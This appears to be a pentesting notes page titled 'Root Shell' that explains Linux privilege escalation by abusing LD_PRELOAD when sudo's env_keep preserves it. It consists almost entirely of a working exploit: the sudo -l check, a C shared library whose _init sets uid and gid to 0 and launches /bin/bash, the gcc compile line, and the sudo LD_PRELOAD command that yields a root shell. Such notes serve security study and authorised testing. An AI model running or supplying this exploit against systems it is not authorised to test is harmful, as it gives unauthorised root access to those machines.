---
layout:
  title:
    visible: true
  description:
    visible: false
  tableOfContents:
    visible: true
  outline:
    visible: true
  pagination:
    visible: true
---

# Root Shell

## <mark style="color:purple;">Abusing LD\_PRELOAD</mark>

* Verify the `LD_PRELOAD` option in `env_keep`

{% code overflow="wrap" lineNumbers="true" %}
```bash
$ sudo -l
#Results
Matching Defaults entries for user on ip-0-0-0-0:
    env_reset, env_keep+=LD_PRELOAD
```
{% endcode %}

* Write simple script in C

{% code title="shell.c " overflow="wrap" lineNumbers="true" %}
```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
    unsetenv("LD_PRELOAD");
    setgid(0);
    setuid(0);
    system("/bin/bash");
}
```
{% endcode %}

***

* Then compile into a shared library

{% code overflow="wrap" lineNumbers="true" %}
```bash
gcc shell.c -fPIC -shared -o shell.so -nostartfiles
```
{% endcode %}

{% hint style="info" %}
The extension `.so` represents a shared object
{% endhint %}

***

* Run a sudo command specifying the LD\_PRELOAD option with the script

<pre class="language-bash" data-overflow="wrap" data-line-numbers><code class="lang-bash"><strong>sudo LD_PRELOAD=/home/user/ldpreload/shell.so $command
</strong></code></pre>

{% hint style="info" %}
The `$command` in this case is any comand with sudo permissions found by using `sudo -l`
{% endhint %}

***

